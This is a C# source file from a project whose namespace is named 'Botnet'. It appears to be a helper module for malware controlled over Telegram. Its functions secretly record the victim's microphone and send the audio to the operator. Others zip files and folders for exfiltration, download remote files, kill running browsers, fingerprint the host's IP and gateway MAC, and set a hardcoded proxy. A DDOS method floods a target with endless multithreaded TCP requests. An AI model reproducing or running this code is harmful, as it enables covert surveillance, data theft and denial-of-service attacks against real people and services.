using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Management;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using NAudio.Wave;

namespace Botnet
{
    class Misc
    {
        TelegramSystem ts;

        public Functions(TelegramSystem ts)
        {
            this.ts = ts;
        }

        [DllImport("winmm.dll")]
        private static extern long mciSendString(string command, StringBuilder retstring, int Returnlenght, IntPtr callback);

        static WaveFileWriter waveFile;

        public void RecordAudio(string time = "5")
        {
            int delay;
            if (!int.TryParse(time, out delay))
                ts.SendMessage("[RecordAudio ERROR] Write correct seconds.");
            else
            {
                delay += 1;
                string path = config.appData + "\\BotFiles\\waveS.wav";
                try
                {
                    WaveInEvent waveSource = new WaveInEvent();
                    //waveSource.DeviceNumber = 0;
                    waveSource.WaveFormat = new WaveFormat(44100, 1);

                    waveSource.DataAvailable += new EventHandler<WaveInEventArgs>(waveSource_DataAvailable);

                    string tempFile = path;
                    waveFile = new WaveFileWriter(tempFile, waveSource.WaveFormat);
                    waveSource.StartRecording();
                    Thread.Sleep(delay * 1000);
                    try
                    {
                        waveSource.StopRecording();
                        waveFile.Dispose();
                        ts.SendDocument(path, $"[RecordAudio {GetIp()}]");
                    }
                    catch (Exception ex) { ts.SendMessage($"[RecordAudio ERROR] {ex.Message}"); }
                }
                catch (Exception ex)
                {
                    ts.SendMessage($"[RecordSound ERROR] {ex.Message}");
                }
            }
        }

        static void waveSource_DataAvailable(object sender, WaveInEventArgs e)
        {
            waveFile.Write(e.Buffer, 0, e.BytesRecorded);
        }

        public string ZipFile(string path)
        {
            string pathToSave = config.appData + $"\\BotFiles\\{Path.GetFileNameWithoutExtension(path)}" + ".zip";
            try
            {
                using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
                {
                    DirectoryInfo di = new DirectoryInfo(path);
                    zip.AddFile(path);
                    zip.Save(pathToSave);
                }
            }
            catch (Exception ex)
            {
                ts.SendMessage($"[ZipFile ERROR] {ex.Message}");
            }
            return pathToSave;
        }

        public string ZipFolder(string folder)
        {
            string pathToSave = config.appData + "\\BotFiles";
            try
            {
                using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
                {
                    DirectoryInfo di = new DirectoryInfo(folder);
                    pathToSave += "\\" + di.Name + ".zip";
                    zip.AddDirectory(folder);
                    zip.Save(pathToSave);
                }
            }
            catch (Exception ex)
            {
                ts.SendMessage($"[ZipFolder ERROR] {ex.Message}");
            }
            return pathToSave;
        }

        public string GetLocalIp()
        {
                string localIP;
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    localIP = endPoint.Address.ToString();
                }
                return localIP;
        }

        public string DownloadFileFromInternet(string URI)
        {
            string file_name = Path.GetFileName(URI);
            string temp_path = Path.GetTempPath();

            string file_path = Path.Combine(temp_path, file_name);

            WebClient wc = new WebClient();
            wc.Proxy = null;

            wc.DownloadFile(URI, file_path);
            return file_path;
        }


        public string DownloadString(string request)
        {
            try
            {
                using (var webClient = new WebClient())
                {
                    string response = webClient.DownloadString(request);
                    return response;
                }
            }
            catch (Exception ex)
            {
                ts.SendMessage($"ERROR: {ex.Message}");
            }

            return string.Empty;
        }

        public void KillBrowsers()  // Закрытие браузеров
        {
            Process prc = new Process();
            Process[] processes = Process.GetProcesses();
            foreach (var process in processes)
            {
                if (process.ProcessName.ToLower().Contains("chrome") || process.ProcessName.ToLower().Contains("opera") || process.ProcessName.ToLower().Contains("browser"))
                    process.Kill();
            }
            Thread.Sleep(500);
        }

        public static string GetIp()
        {
            var request = WebRequest.Create("http://checkip.dyndns.org");
            string reqstring;

            using (var reader = new StreamReader(request.GetResponse().GetResponseStream()))
            {
                reqstring = reader.ReadToEnd();
            }

            string[] a = reqstring.Split(':');
            string a2 = a[1].Substring(1);
            string[] a3 = a2.Split('<');
            string ip = a3[0];

            return ip;
        }

        public WebProxy GetProxy()
        {
            var httpProxy = new WebProxy("161.35.139.101:8080");
            return httpProxy;
        }

        public IPAddress DoGetHostAddresses(string hostname)
        {
            IPAddress[] ips;
            ips = Dns.GetHostAddresses(hostname);
            return ips[0];
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        public static extern int SendARP(int DestIP, int SrcIP, [Out] byte[] pMacAddr, ref int PhyAddrLen);
        // Получаем MAC Адресс
        public string ConvertIpToMAC(IPAddress ip)
        {
            byte[] ab = new byte[6];
            int len = ab.Length;
            int r = SendARP(ip.GetHashCode(), 0, ab, ref len);
            return BitConverter.ToString(ab, 0, 6);
        }

        public void GetMacAddress(out string Mac)
        {
            Mac = "SMTHNG";
            try
            {
                ManagementObjectSearcher NetworkSearcher = new ManagementObjectSearcher("SELECT DefaultIPGateway FROM Win32_NetworkAdapterConfiguration");
                foreach (ManagementObject NetworkObj in NetworkSearcher.Get())
                {
                    string[] router = (string[])(NetworkObj["DefaultIPGateway"]);
                    if (router != null)
                    {
                        Mac = ConvertIpToMAC(IPAddress.Parse(router[0]));
                    }
                }
            }
            catch (Exception ex)
            {
                Mac = $"Error: {ex.Message}";
            }
        }

        public void DDOS(string URI, int thread)
        {
            Thread thr = new Thread(() =>
            {
                Console.WriteLine("Thread started");
                string target = URI;
                int port = 80;
                int threads = thread;

                for (int i = 0; i < threads; i++)
                {
                    Console.WriteLine("For started");
                    new Thread(() =>
                    {
                        Console.WriteLine("Thread");
                        Thread.CurrentThread.IsBackground = true;
                        while (true)
                        {
                            Console.WriteLine("smthng");
                            try
                            {
                                Console.WriteLine("Start");
                                TcpClient client = new TcpClient();
                                client.NoDelay = true;
                                client.Connect(target, port);
                                Console.WriteLine("Connected");
                                StreamWriter stream = new StreamWriter(client.GetStream());
                                stream.AutoFlush = true;
                                stream.Write("POST / HTTP/1.1\r\nHost: " + target + "\r\nConnect-length: 5000\r\n\r\n");
                                StreamReader reader = new StreamReader(client.GetStream());
                                Console.WriteLine(reader.ReadToEnd());
                                client.Close();
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                            }
                        }
                    }).Start();
                }
                while (true) ;
            });

            thr.Start();
        }

        private bool testSite(string url)
        {
            Uri uri = new Uri(url);
            try
            {
                HttpWebRequest httpWebRequest = (HttpWebRequest)HttpWebRequest.Create(uri);
                HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
